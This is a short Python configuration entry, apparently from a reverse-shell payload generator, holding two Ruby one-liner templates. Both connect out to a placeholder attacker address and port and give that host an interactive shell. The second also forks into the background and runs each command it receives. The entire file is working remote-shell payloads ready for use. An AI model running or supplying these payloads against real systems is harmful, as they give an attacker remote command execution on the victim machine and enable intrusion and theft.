conf = {
    "name": "ruby",
    "templates": [
        "ruby -rsocket -e'f=TCPSocket.open(\"%IP%\",%PORT%).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"%IP%\",\"%PORT%\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'"
    ]
}

